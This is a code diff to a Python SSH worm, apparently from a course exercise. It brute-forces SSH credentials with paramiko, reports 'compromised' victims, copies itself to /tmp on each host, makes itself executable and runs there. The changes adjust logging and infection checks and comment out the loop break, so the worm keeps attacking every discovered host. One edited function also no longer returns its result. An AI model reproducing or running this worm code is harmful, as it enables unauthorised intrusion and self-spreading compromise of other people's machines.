@@ -33,11 +33,7 @@ def isInfectedSystem():
 	# as infected).
 	
 	# checks if infected.txt already exists
-
-	if os.path.isfile(INFECTED_MARKER_FILE) == True:
-		print ("true")
-	else:
-		print ("false")
+	os.path.isfile(INFECTED_MARKER_FILE)
 		
 	
 #################################################################
@@ -225,7 +221,7 @@ def attackSystem(host):
 		# return a tuple containing an
 		# instance of the SSH connection
 		# to the remote system. 
-		print("Trying Username & password combination: " +username +" "+ password)
+		#print("Trying Username & password combination: " +username +" "+ password)
 		if tryCredentials(host, username, password, ssh) == 0: 
 			print ("We have successfully compromised the victim: " + host +" with: "+ username + " " + password)
 			attemptResults = (ssh.connect(host,username=username, password=password), username, password)
@@ -234,15 +230,14 @@ def attackSystem(host):
 
 			# If the system was already infected proceed.
 			# Otherwise, infect the system and terminate.
-			# Infect that system	
-			if isInfectedSystem() == True:
-				return 
+			# Infect that system
+			if isInfectedSystem():
+				return
 			# Did the attack succeed?
 			if attemptResults:
 				# create infected file 
 				markInfected()	
-				print ("This system should be infected")
-				
+				print ("This system " + host + " should be infected")
 				# Copy yourself to the remote system. 
 				sftp.put("worm1.py", "/tmp/worm1.py")
 
@@ -254,8 +249,8 @@ def attackSystem(host):
 				# 	# (that is, we know the system is
 				# 	# not yet infected).
 				
-			ssh.exec_command("chmod a+x /tmp/worm1.py")
 
+			ssh.exec_command("chmod a+x /tmp/worm1.py")
 			# /tmp/infected.txt - the malicious file
 
 			# run the whole commnand in the background	
@@ -264,20 +259,8 @@ def attackSystem(host):
 			return attemptResults
 		else: 
 			# Could not find working credentials
-			paramiko.SSHException()
-	
-			#print("These Credentials didn't work: " + username +" "+ password + " on: " + host)
-
-
-		
-		#except IOError:
-		 #      
-		#
-		#
-		
-	
-	
-
+			paramiko.SSHException()	
+			print(username +" "+ password + " Didn't work on: " + host)
 
 # If we are being run without a command line parameters, 
 # then we assume we are executing on a victim system and
@@ -310,11 +293,13 @@ print ("Found hosts: ", networkHosts ,'\n')
 
 
 # Go through the network hosts
-for host in networkHosts:	
+for host in networkHosts:
+	
+	#print("Connecting to: " + host)	
 
 	# Try to attack this host
 	print("Trying to Connect to: " + host)
 	sshInfo =  attackSystem(host)	
-
-	if sshInfo:
-		break	
+	
+	#if sshInfo:
+	#	break	
